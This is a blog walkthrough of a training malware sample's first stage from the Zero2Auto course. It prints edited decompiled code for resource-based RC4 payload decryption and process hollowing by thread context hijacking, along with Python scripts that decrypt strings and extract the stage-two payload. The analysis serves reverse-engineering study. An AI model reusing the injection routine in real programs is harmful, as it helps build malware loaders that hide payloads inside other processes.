<!DOCTYPE html>
<html><head lang="en">
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Zero2Auto: Ch03-Practical Analysis Challenge (Part-I) - TheAbsnt</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="Analysing Base Stage01 of CH03 Challenge binary" />
	<meta property="og:image" content=""/>
	<meta property="og:title" content="Zero2Auto: Ch03-Practical Analysis Challenge (Part-I)" />
<meta property="og:description" content="Analysing Base Stage01 of CH03 Challenge binary" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://theabsnt.github.io/posts/z2ach03/part01/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-08-14T15:25:42+05:30" />
<meta property="article:modified_time" content="2023-08-14T15:25:42+05:30" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Zero2Auto: Ch03-Practical Analysis Challenge (Part-I)"/>
<meta name="twitter:description" content="Analysing Base Stage01 of CH03 Challenge binary"/>
<script src="https://theabsnt.github.io/js/feather.min.js"></script>
	
	
        <link href="https://theabsnt.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
	

	
	<link rel="stylesheet" type="text/css" media="screen" href="https://theabsnt.github.io/css/main.1f5c2e5291e313b4d22d8a955980d8deca3c51589541de041aefce33b65dea88.css" />
		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="https://theabsnt.github.io/css/dark.8e7cf7ce38a68295559c4b37671610aa65c83760158b4154ae4510c4ae7264f9.css"  disabled />
	

	
	
		<script type="text/javascript"
		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
		</script>
	
		
		<script type="text/x-mathjax-config">
		MathJax.Hub.Config({
			tex2jax: {
				inlineMath: [['$','$'], ['\\(','\\)']],
				displayMath: [['$$','$$'], ['\[','\]']],
				processEscapes: true,
				processEnvironments: true,
				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
				TeX: { equationNumbers: { autoNumber: "AMS" },
						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
			}
		});
		</script>
	

	
	
		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
		
		
		<script>
			document.addEventListener("DOMContentLoaded", function() {
					renderMathInElement(document.body, {
							delimiters: [
									{left: "$$", right: "$$", display: true},
									{left: "$", right: "$", display: false}
							]
					});
			});
			</script>
	
	
	
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="https://theabsnt.github.io/">TheAbsnt</a>
	</div>
	<nav>
		
		<a href="/">Home</a>
		
		<a href="/posts">All posts</a>
		
		<a href="/about">About</a>
		
		<a href="/tags">Tags</a>
		
		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
		<script src="https://theabsnt.github.io/js/themetoggle.js"></script>
		
	</nav>
</header>

<main>
	<article>
		<div class="title">
			<h1 class="title">Zero2Auto: Ch03-Practical Analysis Challenge (Part-I)</h1>
			<div class="meta">Posted on Aug 14, 2023</div>
		</div>
		

		<section class="body">
			<p>What is up guys, This post is walktrough of challenge binary(Chapter 03: Practical Analysis) from Zero2Auto course.
In this Part-I of this series we&rsquo;ll walkthrough the base binary(stage01) ie. <code>main_bin.exe</code>. So, let&rsquo;s get started&hellip;</p>
<h2 id="base-payload-main_binexe-stage01">BASE PAYLOAD <code>main_bin.exe</code> (Stage01):</h2>
<h2 id="inside-main">INSIDE <code>main()</code>:</h2>
<ul>
<li>Following is the modified/edited Pseudocode of <code>main()</code> based on IDA decompiler output:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp) {
	decrypt_str_401300(str_kernel32dll);
	decrypt_str_401300(str_findResourceA);      
	hMod <span style="color:#f92672">=</span> LoadLibraryA(str_kernel32dll);
	FindResourceA <span style="color:#f92672">=</span> GetProcAddress(hMod, str_findResourceA);

	decrypt_str_401300(str_loadResource);
	hMod <span style="color:#f92672">=</span> LoadLibraryA(str_kernel32dll);
	LoadResource <span style="color:#f92672">=</span> GetProcAddress(hMod, str_loadResource);

	decrypt_str_401300(str_sizeOfResource);
	hMod <span style="color:#f92672">=</span> LoadLibraryA(str_kernel32dll);
	SizeOfResource <span style="color:#f92672">=</span> GetProcAddress(hMod, str_sizeOfResource);

	decrypt_str_401300(str_lockResource);
	hMod <span style="color:#f92672">=</span> LoadLibraryA(str_kernel32dll);
	LockResource <span style="color:#f92672">=</span> GetProcAddress(hMod, str_lockResource);

	<span style="color:#75715e">// gonna load the desired resource from .rsrc section 
</span><span style="color:#75715e"></span>	hRsrc <span style="color:#f92672">=</span> FindResourceA(NULL, <span style="color:#ae81ff">101</span>, RT_RCDATA);      
	hResLoad <span style="color:#f92672">=</span> LoadResource(NULL, hRsrc);
	dw_sizeOfRsrc <span style="color:#f92672">=</span> SizeOfResource(NULL, hRsrc);
	malloc_wrapper_4038F4(dw_sizeOfRsrc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1C</span>);
	lpRsrcLock <span style="color:#f92672">=</span> LockResource(hResLoad);

	<span style="color:#75715e">// dwSize_of_next_payload = based on some calculation with lpRsrcLock+0x8
</span><span style="color:#75715e"></span>
	decrypt_str_401300(str_virtualAlloc);
	hMod <span style="color:#f92672">=</span> LoadLibraryA(str_kernel32dll);
	VirtualAlloc <span style="color:#f92672">=</span> GetProcAddress(hMod, str_virtualAlloc);

	lpAlloc_mem_for_stg02 <span style="color:#f92672">=</span> VirtuaAlloc(<span style="color:#ae81ff">0</span>, dwSize_of_next_payload, MEM_COMMIT, PAGE_READWRITE);
	possible_memcpy_402DB0(lpAlloc_mem, lpRsrcLock<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1C</span>, dwSize_of_next_payload);

	possible_memset_4025B0(S_array, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x102</span>); 
	<span style="color:#75715e">//then rc4 decryption routine(with &#34;key&#34; being &#34;lpRsrcLock+0xC&#34; 
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// till next 15bytes in hex ie. &#34;6b6b64355964504d32345642586d69&#34;) 
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// to get an PE file(next payload) at &#39;lpAlloc_mem_for_stg02&#39; 
</span><span style="color:#75715e"></span>
	<span style="color:#75715e">// pass decrypted pe file to this funtions`
</span><span style="color:#75715e"></span>	sub_401000(lpAlloc_mem_for_stg02); 
	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}	
</code></pre></div><ul>
<li>
<p>This binary starts off by decrypting the needed module and win32API function name strings using <code>sub_401030</code> (which performs <code>ROT13</code> on encrypted string against <code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890./=</code>), to dynamically load them using <code>LoadLibraryA</code> followed by <code>GetProcAddress</code></p>
</li>
<li>
<p>functions dynamically loaded are <code>FindResourceA</code>, <code>LoadResource</code>, <code>SizeOfResource</code>, <code>LockResource</code>, <code>VirtualAlloc</code> from <code>kernel32dll</code></p>
</li>
<li>
<p>moving on, we see it finds(<code>FindReosurceA</code>), loads(<code>LoadResource</code>), gets the size(<code>SizeOfResource</code>), lastly locks(<code>LockResource</code>) a resource from <code>.rsrc</code> section with <code>ID = 101(0x65)</code> of type <code>RT_RCDATA(0xA)</code> with size <code>0x1541C</code></p>
</li>
<li>
<p>then it calculates the size(based on <code>lpRsrcLock+0x8</code> ie. <code>0x2200</code>) for the data after offset <code>lpRsrcLock+0x1C</code> from resource ie. <code>0x1541C - 0x1C =&gt; 0x15400</code>, then allocates(<code>VirtualAlloc</code>) that much space to fill it with the buffer <code>lpRsrcLock+0x1C</code> using <code>sub_402DB0</code></p>
</li>
<li>
<p>moving on, we see the constant <code>256</code> a bunch of times along with loops containing enough arithmetic instruction, with a quick search it reveals that this is <code>RC4</code> decryption routine, not going deep into algorithm itself:</p>
<ul>
<li>it&rsquo;s a 3 staged stream cipher algorithm consisting of</li>
<li><code>KSA(Key Scheduling Algorithm)</code>: which initializes a list of values from <code>0</code> to <code>256</code> which is then swapped with value based on calculation done with key</li>
<li><code>PRGA(Pseudo-Random Generation Algorithm)</code>: generates and outputs the keystream using the scrambled list we had, and generates as many bytes needed up to <code>256</code></li>
<li><code>XOR</code> Operation: XORing each byte of ciphertext/plaintext with a byte of the keystream generated</li>
</ul>
</li>
<li>
<p>in this case the key is the next <code>15</code> bytes from <code>lpRsrcLock+0xC</code> ie. <code>&quot;6b6b64355964504d32345642586d69&quot;</code> when the decryption routine finishes we&rsquo;re left with an executable in previously allocated memory, which is then passed as an only argument to <code>sub_401000</code></p>
</li>
</ul>
<hr>
<h2 id="inside-sub_401000">INSIDE <code>SUB_401000()</code>:</h2>
<p>This Function gonna perform <strong>PROCESS INJECTION</strong> using <strong>THREAD CONTEXT HIJACKING</strong> in order to inject/execute the payload supplied as argument:</p>
<ul>
<li>Following is the modified/edited Pseudocode of <code>sub_401000()</code> based on IDA decompiler output:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> __thiscall <span style="color:#a6e22e">sub_401000</span>(_IMAGE_DOS_HEADER <span style="color:#f92672">*</span>stg02) {
	stg02_nt_Headers <span style="color:#f92672">=</span> stg02 <span style="color:#f92672">+</span> stg02<span style="color:#f92672">-&gt;</span>e_lfanew;
	ptr_stg02_nt_headers <span style="color:#f92672">=</span> stg02_nt_headers;

	<span style="color:#75715e">// get current running executable&#39;s full path
</span><span style="color:#75715e"></span>	GetModuleFileNameA(NULL, lpFilename_self, <span style="color:#ae81ff">0x400</span>); 
	
	<span style="color:#75715e">// verify if stg02 payload is a legit PE file by verifying 
</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> stg02_nt_headers<span style="color:#f92672">-&gt;</span>Signature <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x4550</span>
		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;

	possible_memset_4025B0(<span style="color:#f92672">&amp;</span>lpStartupInfo, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x44</span>);

	<span style="color:#75715e">// now create the another process of itself(lpFilename) in suspended state(4) and store process information in &#39;lpProcessInfo&#39; struct
</span><span style="color:#75715e"></span>	decryptStr_401300(str_kernel32dll);
	decryptStr_401300(str_CreatesProcessA);
	hMod <span style="color:#f92672">=</span> LoadLibraryA(str_kernel32dll);
	CreateProcessA <span style="color:#f92672">=</span> GetProcAddress(hMod, str_CreatesProcessA);
	<span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>CreateProcessA(lpFilename_self, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, CREATE_SUSPENDED, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>lpStartupInfo, <span style="color:#f92672">&amp;</span>lpProcessInfo) )
	    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;

	decryptStr_401300(str_VirtualAlloc);
	hMod_1 <span style="color:#f92672">=</span> LoadLibraryA(str_kernel32dll);
	VirtualAlloc <span style="color:#f92672">=</span> GetProcAddress(hMod_1, str_VirtualAlloc);
	lpContext <span style="color:#f92672">=</span> VirtualAlloc(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">4</span>, MEM_COMMIT, PAGE_READWRITE);
	lpContext<span style="color:#f92672">-&gt;</span>ContextFlags <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10007</span>;

	<span style="color:#75715e">// get the thread context of thread inside suspended process
</span><span style="color:#75715e"></span>	decryptStr_401300(str_GetThreadContext);
	hMod_2 <span style="color:#f92672">=</span> LoadLibraryA(str_kernel32dll);
	GetThreadContext <span style="color:#f92672">=</span> GetProcAddress(hMod_2, str_GetThreadContext);
	<span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>GetThreadContext(lpProcessInfo.hThread, lpContext) )
		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;

	decryptStr_401300(str_ReadProcessMemory);
	hMod_3 <span style="color:#f92672">=</span> LoadLibraryA(str_kernel32dll);
	ReadProcessMemory <span style="color:#f92672">=</span> GetProcAddress(hMod_3, str_ReadProcessMemory);
	
	decryptStr_401300(str_WriteProcessMemory);
	hMod_4 <span style="color:#f92672">=</span> LoadLibraryA(str_kernel32dll);
	WriteProcessMemory <span style="color:#f92672">=</span> GetProcAddress(hMod_4, str_WriteProcessMemory);

	<span style="color:#75715e">// copy the imageBaseAddress(&#39;lpContext-&gt;Ebx + 0x8&#39; ie. PEB-&gt;ImageBaseAddress) to &#39;lpImageBaseOfSusProc&#39;
</span><span style="color:#75715e"></span>	<span style="color:#75715e">// lpContext-&gt;Ebx = at the time of suspended state this register holds the address of PEB
</span><span style="color:#75715e"></span>	ReadProcessMemory(lpProcessInfo<span style="color:#f92672">-&gt;</span>hProcess, lpContext<span style="color:#f92672">-&gt;</span>Ebx <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>, lpImageBaseOfSusProc, <span style="color:#ae81ff">0x4</span>, NULL);

	<span style="color:#75715e">// allocate memory in suspended process with base address 0x400000(stg02+0x134) of size 0x18000(stg02+0x150) with RWX(0x40) access
</span><span style="color:#75715e"></span>	decryptStr_401300(str_VirtualAllocEx);
	hMod_5 <span style="color:#f92672">=</span> LoadLibraryA(str_kernel32dll);
	VirtualAllocEx <span style="color:#f92672">=</span> GetProcAddress(hMod_5, str_VirtualAllocEx);
	lpMemInTargetProc <span style="color:#f92672">=</span> VirtualAllocEx(
						lpProcessInfo.hProcess,
						stg02_nt_headers<span style="color:#f92672">-&gt;</span>OptionalHeader.ImageBase,
						stg02_nt_headers<span style="color:#f92672">-&gt;</span>OptionalHeader.SizeOfImage,
						<span style="color:#ae81ff">0x3000</span>,
						PAGE_EXECUTE_READWRITE);

	<span style="color:#75715e">// first gonna write the header of stg02 in memory allocated inside suspended process
</span><span style="color:#75715e"></span>	WriteProcessMemory(lpProcessInfo.hProcess, lpMemInTargetProc, stg02, stg02_nt_headers<span style="color:#f92672">-&gt;</span>OptionalHeader.SizeOfHeaders, <span style="color:#ae81ff">0</span>);

	<span style="color:#75715e">// if number of sections in stg02 is not 0
</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> ( ptr_stg02_nt_headers<span style="color:#f92672">-&gt;</span>FileHeader.NumberOfSections ) {
		<span style="color:#66d9ef">do</span> {
		  <span style="color:#75715e">// gonna run a loop to write all section of stg02 to the suspended process memory
</span><span style="color:#75715e"></span>		} <span style="color:#66d9ef">while</span> ( noOfSectionWritten <span style="color:#f92672">&lt;</span> ptr_stg02_nt_headers<span style="color:#f92672">-&gt;</span>FileHeader.NumberOfSections );
	}

	<span style="color:#75715e">// set the PEB-&gt;ImageBaseAddress(lpContext-&gt;Ebx+0x8) of supended process to imageBaseAddress of stg02 
</span><span style="color:#75715e"></span>	WriteProcessMemory(lpProcessInfo.hProcess, lpContext<span style="color:#f92672">-&gt;</span>Ebx <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>, stg02_nt_headers<span style="color:#f92672">-&gt;</span>OptionalHeader.ImageBase, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0</span>);
	
	decryptStr_401300(str_SetThreadContext);
	hMod_6 <span style="color:#f92672">=</span> LoadLibraryA(str_kernel32dll);
	SetThreadContext <span style="color:#f92672">=</span> GetProcAddress(hMod_6, str_SetThreadContext);
	
	decryptStr_401300(str_ResumeThread);
	hMod_7 <span style="color:#f92672">=</span> LoadLibraryA(str_kernel32dll);
	ResumeThread <span style="color:#f92672">=</span> GetProcAddress(hMod_7, str_ResumeThread);

	<span style="color:#75715e">// now set: lpContext+Eax = original entry point of stg02 ie. 0x4022f3(main)
</span><span style="color:#75715e"></span>	lpContext<span style="color:#f92672">-&gt;</span>Eax <span style="color:#f92672">=</span> lpMemInTargetProc <span style="color:#f92672">+</span> ptr_stg02_nt_headers<span style="color:#f92672">-&gt;</span>OptionalHeader.AddressOfEntryPoint;
	<span style="color:#75715e">// gonna set thread context of suspend, after modifying eax in it
</span><span style="color:#75715e"></span>	SetThreadContext(lpProcessInfo.hThread, lpContext);
	ResumeThread(lpProcessInfo.hThread);    <span style="color:#75715e">// thne resume the suspended thread
</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><ul>
<li>
<p>creates a child process of it&rsquo;s own in suspended state using <code>CreateProcessA()</code></p>
</li>
<li>
<p>then, get the thread <code>Context</code> of thread inside suspended process using <code>GetThreadContext()</code> in order to manipulate it later</p>
</li>
<li>
<p>allocate some memory in suspended process using <code>VirtualAllocEx</code> with base address <code>0x400000(stg02_nt_headers-&gt;OptionalHeader.ImageBase)</code></p>
</li>
<li>
<p>the using loop, this will write the payload section-by-section to the allocated memory using <code>WriteProcessMemory()</code></p>
</li>
<li>
<p>after injecting the payload in target process,  this set the thread context back using <code>SetThreadContext()</code> after modifying the <code>lpContext-&gt;Eax</code> to <code>0x4022F3</code> (ie. original entry point(<code>main</code>) of the stage02)</p>
</li>
<li>
<p>then resume the suspended thread using <code>ResumeThread()</code>, which will immediately resume execution of injected payload from earlier set entry point</p>
</li>
</ul>
<blockquote>
<p><strong>TIP:</strong>
to break on the executing/injected payload in target process:</p>
<ul>
<li>attach the targeted process to <code>x32dbg</code>, then navigate to <code>Memory Map</code> tab , then <code>Follow in Dump</code> the memory(payload address of <code>0x400000</code> with size <code>0x18000</code>), you&rsquo;ll see an executable header(<code>4D5A..</code>), form here go to the entry point offset then <code>main</code>  in this case its <code>0x401EA0</code> then <code>Follow in Disassembler</code>, put a break point there</li>
<li>after resuming the thread from parent process, simply resume the debugger of child process and you&rsquo;ll jump to your intended breakpoint</li>
</ul>
</blockquote>
<h2 id="automations-for-this-binary">AUTOMATIONS FOR THIS BINARY:</h2>
<h2 id="--string-decryption-performed-by-sub_401300">- String decryption performed by <code>sub_401300</code>:</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># decryptStr_401300.py</span>
<span style="color:#75715e"># Author: ME :D</span>

<span style="color:#75715e"># this decryption routine, kinda performs string decryption similar to ROT 13 but on given set of chararcters ie. &#39;all_chars&#39;</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(enc_str):
	dec_str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
    all_chars <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890./=&#34;</span>

    <span style="color:#66d9ef">if</span>(len(enc_str) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>):
	    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(enc_str)):
	        <span style="color:#66d9ef">if</span> enc_str[i] <span style="color:#f92672">in</span> all_chars:
	            index_of_chr <span style="color:#f92672">=</span> all_chars<span style="color:#f92672">.</span>index(enc_str[i])
                <span style="color:#66d9ef">if</span> (index_of_chr <span style="color:#f92672">+</span> <span style="color:#ae81ff">13</span>) <span style="color:#f92672">&lt;</span> len(all_chars):
	                dec_str <span style="color:#f92672">+=</span> all_chars[index_of_chr <span style="color:#f92672">+</span> <span style="color:#ae81ff">13</span>]
                <span style="color:#66d9ef">else</span>:
                    dec_str <span style="color:#f92672">+=</span> all_chars[index_of_chr <span style="color:#f92672">-</span> len(all_chars) <span style="color:#f92672">+</span> <span style="color:#ae81ff">13</span>]
<span style="color:#66d9ef">return</span> dec_str

<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
	enc_str <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;String to decrypt: &#34;</span>)
    print(<span style="color:#e6db74">&#34;Decrypted Str: &#34;</span>, decrypt(enc_str))
</code></pre></div><h2 id="--stage02-extraction-from-rsrc-section-and-decryption">- Stage02 Extraction from <code>.rsrc</code> section and Decryption:</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> pefile
<span style="color:#f92672">from</span> arc4 <span style="color:#f92672">import</span> ARC4

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">extract_rsrc</span>(pe):
	<span style="color:#66d9ef">for</span> resrc <span style="color:#f92672">in</span> pe<span style="color:#f92672">.</span>DIRECTORY_ENTRY_RESOURCE<span style="color:#f92672">.</span>entries:
		<span style="color:#66d9ef">for</span> entry <span style="color:#f92672">in</span> resrc<span style="color:#f92672">.</span>directory<span style="color:#f92672">.</span>entries:
			<span style="color:#75715e"># name of resource if present</span>
			print(<span style="color:#e6db74">&#34;Resource Name:&#34;</span>, entry<span style="color:#f92672">.</span>name)  
			<span style="color:#75715e"># resource id of parent resource</span>
			print(<span style="color:#e6db74">&#34;Resource ID(Parent):&#34;</span>, entry<span style="color:#f92672">.</span>id) 
			<span style="color:#75715e"># resource id of this resource</span>
			print(<span style="color:#e6db74">&#34;Reosurce ID:&#34;</span>, entry<span style="color:#f92672">.</span>directory<span style="color:#f92672">.</span>entries[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>id) 

			<span style="color:#75715e"># get the size of this resource</span>
			sizeOfRsrc <span style="color:#f92672">=</span> entry<span style="color:#f92672">.</span>directory<span style="color:#f92672">.</span>entries[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>data<span style="color:#f92672">.</span>struct<span style="color:#f92672">.</span>Size  
			print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Size of resource: </span><span style="color:#e6db74">{</span>hex(sizeOfRsrc)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)

			<span style="color:#75715e"># get the offset of this resource</span>
			offsetToRsrc <span style="color:#f92672">=</span> entry<span style="color:#f92672">.</span>directory<span style="color:#f92672">.</span>entries[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>data<span style="color:#f92672">.</span>struct<span style="color:#f92672">.</span>OffsetToData
			print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Offset to resource: </span><span style="color:#e6db74">{</span>hex(offsetToRsrc)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)

			<span style="color:#75715e"># write the reosurce ot a variable to return</span>
			rsrc <span style="color:#f92672">=</span> pe<span style="color:#f92672">.</span>get_memory_mapped_image()[offsetToRsrc:offsetToRsrc<span style="color:#f92672">+</span>sizeOfRsrc]

			<span style="color:#66d9ef">return</span> rsrc

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rc4_decrypt</span>(key, data):
	cipher <span style="color:#f92672">=</span> ARC4(key)
	decrypted_data <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(data)
	<span style="color:#66d9ef">return</span> decrypted_data

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
	pe <span style="color:#f92672">=</span> pefile<span style="color:#f92672">.</span>PE(<span style="color:#e6db74">&#39;main_bin.exe&#39;</span>)
	<span style="color:#75715e"># store the extracted resource</span>
	extracted_resource <span style="color:#f92672">=</span> extract_rsrc(pe)  

	<span style="color:#75715e"># RC4 decryption follows with key being 15bytes from 0xC, </span>
	<span style="color:#75715e"># and rest of data is to be decrypted</span>
	decrypted_resource <span style="color:#f92672">=</span> rc4_decrypt(extracted_resource[<span style="color:#ae81ff">0xC</span>:<span style="color:#ae81ff">27</span>], extracted_resource[<span style="color:#ae81ff">0x1C</span>:])
	executable <span style="color:#f92672">=</span> decrypted_resource

	<span style="color:#75715e"># now write it to a new file</span>
	<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;decrypted_Stage02.bin&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
		f<span style="color:#f92672">.</span>write(executable)

	print(<span style="color:#e6db74">&#34;[+]Done extracting..&#34;</span>)

<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;__main__&#34;</span> <span style="color:#f92672">==</span> __name__:
	main()
</code></pre></div><hr>
<h2 id="conclusion">Conclusion:</h2>
<p>Now that we know, how the decryption of stage-02 is taking place using RC4 algorithm, also the &lsquo;key&rsquo; for decryption and how the payload is injected and resumed to execute it and how put a breakpoint to it. Now in the part-II we&rsquo;ll focus on working of stage 02</p>
<p>See you there :)</p>

		</section>

		<div class="post-tags">
			
			
			<nav class="nav tags">
				<ul class="tags">
					
					<li><a href="/tags/reverse-engineering">reverse engineering</a></li>
					
					<li><a href="/tags/zero2auto">zero2auto</a></li>
					
				</ul>
			</nav>
			
			
		</div>
		</article>
</main>
<footer>
  <div style="display:flex"><a class="soc" href="https://github.com/TheAbsnt" rel="me" title="GitHub"><i data-feather="github"></i></a>
    <a class="border"></a><a class="soc" href="https://twitter.com/TheAbsnt/" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
    <a class="border"></a></div>
  <div class="footer-info">
    2023  © TheAbsnt |  <a
      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
  </div>
</footer>


<script>
  feather.replace()
</script></div>
    </body>
</html>
